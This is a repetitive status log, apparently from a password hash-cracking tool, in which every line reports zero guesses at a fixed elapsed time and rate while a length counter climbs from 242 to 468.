guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:242/242/242 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:243/243/243 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:244/244/244 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:245/245/245 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:246/246/246 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:247/247/247 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:248/248/248 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:249/249/249 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:250/250/250 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:251/251/251 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:252/252/252 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:253/253/253 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:254/254/254 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:255/255/255 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:256/256/256 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:257/257/257 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:258/258/258 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:259/259/259 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:260/260/260 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:261/261/261 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:262/262/262 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:263/263/263 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:264/264/264 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:265/265/265 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:266/266/266 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:267/267/267 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:268/268/268 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:269/269/269 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:270/270/270 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:271/271/271 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:272/272/272 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:273/273/273 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:274/274/274 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:275/275/275 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:276/276/276 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:277/277/277 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:278/278/278 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:279/279/279 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:280/280/280 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:281/281/281 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:282/282/282 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:283/283/283 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:284/284/284 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:285/285/285 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:286/286/286 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:287/287/287 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:288/288/288 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:289/289/289 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:290/290/290 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:291/291/291 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:292/292/292 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:293/293/293 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:294/294/294 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:295/295/295 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:296/296/296 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:297/297/297 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:298/298/298 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:299/299/299 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:300/300/300 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:301/301/301 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:302/302/302 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:303/303/303 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:304/304/304 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:305/305/305 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:306/306/306 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:307/307/307 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:308/308/308 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:309/309/309 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:310/310/310 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:311/311/311 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:312/312/312 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:313/313/313 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:314/314/314 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:315/315/315 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:316/316/316 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:317/317/317 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:318/318/318 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:319/319/319 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:320/320/320 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:321/321/321 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:322/322/322 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:323/323/323 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:324/324/324 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:325/325/325 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:326/326/326 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:327/327/327 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:328/328/328 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:329/329/329 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:330/330/330 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:331/331/331 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:332/332/332 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:333/333/333 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:334/334/334 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:335/335/335 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:336/336/336 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:337/337/337 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:338/338/338 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:339/339/339 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:340/340/340 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:341/341/341 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:342/342/342 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:343/343/343 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:344/344/344 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:345/345/345 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:346/346/346 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:347/347/347 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:348/348/348 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:349/349/349 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:350/350/350 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:351/351/351 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:352/352/352 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:353/353/353 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:354/354/354 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:355/355/355 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:356/356/356 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:357/357/357 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:358/358/358 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:359/359/359 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:360/360/360 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:361/361/361 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:362/362/362 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:363/363/363 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:364/364/364 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:365/365/365 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:366/366/366 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:367/367/367 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:368/368/368 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:369/369/369 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:370/370/370 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:371/371/371 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:372/372/372 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:373/373/373 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:374/374/374 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:375/375/375 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:376/376/376 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:377/377/377 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:378/378/378 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:379/379/379 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:380/380/380 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:381/381/381 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:382/382/382 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:383/383/383 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:384/384/384 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:385/385/385 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:386/386/386 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:387/387/387 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:388/388/388 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:389/389/389 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:390/390/390 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:391/391/391 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:392/392/392 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:393/393/393 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:394/394/394 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:395/395/395 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:396/396/396 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:397/397/397 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:398/398/398 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:399/399/399 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:400/400/400 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:401/401/401 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:402/402/402 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:403/403/403 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:404/404/404 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:405/405/405 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:406/406/406 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:407/407/407 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:408/408/408 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:409/409/409 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:410/410/410 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:411/411/411 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:412/412/412 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:413/413/413 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:414/414/414 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:415/415/415 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:416/416/416 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:417/417/417 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:418/418/418 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:419/419/419 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:420/420/420 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:421/421/421 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:422/422/422 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:423/423/423 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:424/424/424 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:425/425/425 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:426/426/426 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:427/427/427 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:428/428/428 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:429/429/429 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:430/430/430 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:431/431/431 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:432/432/432 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:433/433/433 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:434/434/434 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:435/435/435 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:436/436/436 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:437/437/437 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:438/438/438 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:439/439/439 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:440/440/440 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:441/441/441 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:442/442/442 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:443/443/443 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:444/444/444 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:445/445/445 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:446/446/446 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:447/447/447 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:448/448/448 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:449/449/449 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:450/450/450 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:451/451/451 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:452/452/452 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:453/453/453 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:454/454/454 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:455/455/455 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:456/456/456 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:457/457/457 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:458/458/458 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:459/459/459 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:460/460/460 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:461/461/461 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:462/462/462 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:463/463/463 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:464/464/464 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:465/465/465 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:466/466/466 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:467/467/467 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:468/468/468 FL
